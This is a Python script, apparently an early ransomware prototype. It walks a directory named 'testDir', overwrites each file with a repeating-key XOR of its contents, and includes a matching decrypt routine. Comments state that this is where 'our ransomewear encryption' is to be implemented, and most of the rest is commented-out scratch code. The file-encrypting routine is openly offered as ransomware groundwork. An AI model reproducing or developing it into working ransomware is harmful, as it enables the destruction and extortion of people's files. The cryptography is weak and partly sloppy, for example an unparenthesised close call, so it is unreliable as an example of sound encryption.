#!/usr/bin/env python

#imports
from pathlib import Path
import numpy
import struct
import os
import re
import binascii
import base64
from itertools import cycle
import magic



#Step 1: 
#Scan dir presented to find all files located inside file.
xorKey = "5#!@#!ga42414214124sdg1"
holder = ""

def encryptXor():
    for root, dirs, files in os.walk("testDir"):
        for file1 in files:
        
            # data can be held in differnt formats which mean we have to account for them.
            data = open(os.path.join(root,file1),"rb+")

            dataValue = data.read()
            #print(dataValue)
           # print(type(dataValue))
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))
           # for i in range(len(dataValue)):
           #     print(chr(dataValue[i])^ord(cycle(xorKey)))
            #encodedVal = value.encode()
            #for i in (len)

           # print(type(value))
           # print(value)
            
            data.write(value)

            data.truncate()

            data.close()
            

def decryptXor():
    for root, dirs, files in os.walk("testDir"):
        for file2 in files:
            
            #data = Path(os.path.join(root,file)).read_bytes()
            #print(data)

            data = open(os.path.join(root,file2),"rb+")
            dataValue = data.read()
            #print(dataValue)
                #print(bytearrayValue)
            
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))

           # value = ''.join(chr(ord(x)^ord(y)) for (x,y) in zip(str(dataValue), cycle(xorKey)))
                
            data.write(value) #writes over the files <---- so we want to implement our ransomewear encryption here

                    
            data.truncate()
            data.close


def main():
    #encryptXor()
    #print(holder)
    print("DONE ENCRYPTION")

    decryptXor()
    print("DONE Decryption")
    #print(holder)



if __name__ == "__main__":
    # execute only if run as a script
    main()


"""if len(binary_representation) == 7:
                    binary_representation = "0"+binary_representation
                if len(binary_representation) == 6:
                    binary_representation = "00"+binary_representation
                if len(binary_representation) == 5:
                    binary_representation = "000"+binary_representation
                if len(binary_representation) == 4:
                    binary_representation = "0000"+binary_representation
                if len(binary_representation) == 3:
                    binary_representation = "00000"+binary_representation
                if len(binary_representation) == 2:
                    binary_representation = "000000"+binary_representation
                if len(binary_representation) == 1:
                    binary_representation = "0000000"+binary_representation
"""
                #print(binary_representation.encode())
                #print(struct.pack("",int(binary_representation)).decode("utf-8"))
                #print(bin(int(binary_representation)^xorKey))
                #for bit in binary_representation:



               # print(str(binary_representation))
                #bytelist.append(binary_representation)


            #f.seek(0) #finds the initial position in the file
            #f.write("LOOOOOL") #writes over the files <---- so we want to implement our ransomewear encryption here
            #f.truncate() #overwrites everything else
        





        #print(os.path.join(file))

            #print(os.path.join(root,file))




#Step 2:
#As Scan occurs take data from files and turn data into binary data --> can store in some data struct

#Step 3:
#Take binary data 

#testVal = bytearray("texttest.txt")
#print(testVal)

#XOR

#data = Path("test.jpg").read_bytes()
#print(data)


isFile = os.path.isdir("testDir")
isFile1 = os.path.isfile("testDir")
#print(isFile)
#print(isFile1)
#i = int.from_bytes(data[:4], byteorder="little",signed=False)
#print(i)

#numpy.fromfile


